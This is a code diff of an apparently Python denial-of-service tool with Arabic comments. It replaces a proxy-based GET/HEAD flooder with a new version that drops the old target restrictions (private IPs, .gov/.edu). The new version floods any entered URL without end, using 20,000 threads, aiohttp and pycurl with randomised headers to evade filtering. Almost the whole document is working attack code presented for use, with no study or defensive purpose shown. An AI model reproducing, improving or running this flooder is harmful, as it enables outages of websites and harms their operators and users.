@@ -1,161 +1,125 @@
-import os
-import random
-import time
-import socket
-import sys
-import threading
 import requests
-import socks
-import ssl
+import aiohttp
+import asyncio
+import pycurl
+from colorama import Fore, Style
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from io import BytesIO
+import random
 
-# واجهة المستخدم
-print('''\r\n
-██████╗ ██╗   ██╗███╗   ███╗███╗   ███╗███████╗██╗         
-██╔══██╗██║   ██║████╗ ████║████╗ ████║██╔════╝██║         
-██████╔╝██║   ██║██╔████╔██║██╔████╔██║█████╗  ██║         
-██╔═══╝ ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║         
-██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
-╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝   
-┌─────────────────────────────────────────────────────┐
-│ version 1.2.8                                       │
-│                                                     │
-│          [!!!Prevent Illegal CC-Attack!!!]          │                      
-│                                                     │
-│                               Code By HC the Chlous │
-├─────────────────────────────────────────────────────┤
-│       Github: https://github.com/HC133/Pummel	      │
-│           [!]DO NOT ATTACK GOV WEBSITE[!]           │
-└─────────────────────────────────────────────────────┘\r\n''')
+# متغير لتتبع حالة إيقاف الهجوم
+stop_attack_flag = False
 
-# قائمة User-Agent
-useragents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-    # ... (أضف بقية الـ User-Agents هنا)
+# قائمة برؤوس HTTP مختلفة
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
 ]
 
-# قائمة Accept headers
-acceptall = [
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-    "Accept-Encoding: gzip, deflate\r\n",
-    # ... (أضف بقية الـ Accept headers هنا)
+REFERERS = [
+    "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://www.yahoo.com/",
+    "https://www.duckduckgo.com/",
 ]
 
-# دالة لمنع الهجمات على عناوين محددة
-def prevent():
-    if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip:
-        print("Error: Invalid IP range!")
-        sys.exit()
-    if 'gov' in ip or 'edu' in ip:
-        print("Error: Cannot attack .gov or .edu websites!")
-        sys.exit()
+def get_random_headers():
+    """إرجاع رؤوس HTTP عشوائية."""
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Referer": random.choice(REFERERS),
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+    }
 
-# الدالة الرئيسية
+def send_requests_threaded(target):
+    session = requests.Session()
+    
+    def send_request():
+        while not stop_attack_flag:
+            try:
+                headers = get_random_headers()
+                session.get(target, headers=headers, timeout=5)
+            except requests.exceptions.RequestException:
+                pass
+
+    num_threads = 20000  # زيادة عدد الخيوط لتحسين الأداء
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(send_request) for _ in range(num_threads)]
+        
+        for future in as_completed(futures):
+            if stop_attack_flag:
+                break
+
+async def send_requests_aiohttp(target):
+    async with aiohttp.ClientSession() as session:
+        while not stop_attack_flag:
+            try:
+                headers = get_random_headers()
+                async with session.get(target, headers=headers, timeout=5) as response:
+                    await response.text()
+            except aiohttp.ClientError:
+                pass
+
+def send_requests_pycurl(target):
+    while not stop_attack_flag:
+        buffer = BytesIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, target)
+        c.setopt(c.WRITEDATA, buffer)
+        headers = get_random_headers()
+        c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
+        try:
+            c.perform()
+        except pycurl.error:
+            pass
+        finally:
+            c.close()
+
+def start_attack():
+    global stop_attack_flag
+    try:
+        target = input("Target URL: ")
+        print("Attack will continue indefinitely. Type 'stop' to end it.")
+        execute_attack(target)
+    except Exception as e:
+        print(f"Error: {str(e)}")
+
+def execute_attack(target):
+    global stop_attack_flag
+
+    print(f"Starting continuous attack on {target}...")
+
+    try:
+        # استخدام ThreadPoolExecutor للخيوط
+        with ThreadPoolExecutor() as executor:
+            executor.submit(send_requests_threaded, target)
+
+        # استخدام asyncio للبرمجة غير المتزامنة
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(send_requests_aiohttp(target))
+
+        # استخدام pycurl
+        send_requests_pycurl(target)
+
+        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)
+
+    except KeyboardInterrupt:
+        stop_attack_flag = True
+        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
+
+    except Exception as e:
+        print(f"Error during attack: {str(e)}")
+
 def main():
-    global ip, port, page, th_num, proxies, multiple, mode
+    try:
+        start_attack()
+    except Exception as e:
+        print(f"Error: {str(e)}")
 
-    mode = input("Mode You Want To Choose (get/head): ").lower() or "get"
-    if mode not in ["get", "head"]:
-        print("Invalid mode! Using 'get' as default.")
-        mode = "get"
-
-    ip = input("Address/Host: ")
-    prevent()
-
-    page = input("Page (default=/): ") or "/"
-    port = input("Port (default=80, HTTPS=443): ") or "80"
-    port = int(port)
-
-    th_num = input("Threads (default=300): ") or "300"
-    th_num = int(th_num)
-
-    # إدخال البروكسي يدويًا
-    proxies = []
-    print("Enter SOCKS5 proxies in the format IP:PORT (e.g., 127.0.0.1:1080).")
-    print("Type 'done' when finished.")
-    while True:
-        proxy = input("Proxy: ")
-        if proxy.lower() == "done":
-            break
-        if ":" in proxy:
-            proxies.append(proxy.strip())
-        else:
-            print("Invalid format! Use IP:PORT.")
-
-    print(f"Number of SOCKS5 Proxies: {len(proxies)}")
-
-    if input("Check the SOCKS list? (y/n, default=y): ").lower() != "n":
-        check_socks()
-
-    multiple = input("Input the Multiple (default=100): ") or "100"
-    multiple = int(multiple)
-
-# دالة لإرسال طلبات GET
-def get():
-    while True:
-        try:
-            proxy = random.choice(proxies).strip().split(":")
-            socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
-            s = socks.socksocket()
-            if port == 443:
-                ctx = ssl.create_default_context()
-                s = ctx.wrap_socket(s, server_hostname=ip)
-            s.connect((ip, port))
-            for _ in range(multiple):
-                request = f"GET {page} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(useragents)}\r\n{random.choice(acceptall)}\r\n"
-                s.send(request.encode())
-            s.close()
-        except Exception as e:
-            pass
-
-# دالة لإرسال طلبات HEAD
-def head():
-    while True:
-        try:
-            proxy = random.choice(proxies).strip().split(":")
-            socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
-            s = socks.socksocket()
-            if port == 443:
-                ctx = ssl.create_default_context()
-                s = ctx.wrap_socket(s, server_hostname=ip)
-            s.connect((ip, port))
-            for _ in range(multiple):
-                request = f"HEAD {page} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(useragents)}\r\n{random.choice(acceptall)}\r\n"
-                s.send(request.encode())
-            s.close()
-        except Exception as e:
-            pass
-
-# دالة لفحص SOCKS proxies
-def check_socks():
-    global proxies
-    working_proxies = []
-    for proxy in proxies:
-        try:
-            proxy_ip, proxy_port = proxy.split(":")
-            socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
-            s = socks.socksocket()
-            s.settimeout(5)
-            s.connect((ip, port))
-            s.close()
-            working_proxies.append(proxy)
-        except:
-            pass
-    proxies = working_proxies
-    print(f"Checked proxies. Working: {len(proxies)}")
-
-# تشغيل البرنامج
 if __name__ == "__main__":
     main()
-    threads = []
-    for _ in range(th_num):
-        if mode == "get":
-            t = threading.Thread(target=get)
-        else:
-            t = threading.Thread(target=head)
-        t.daemon = True
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
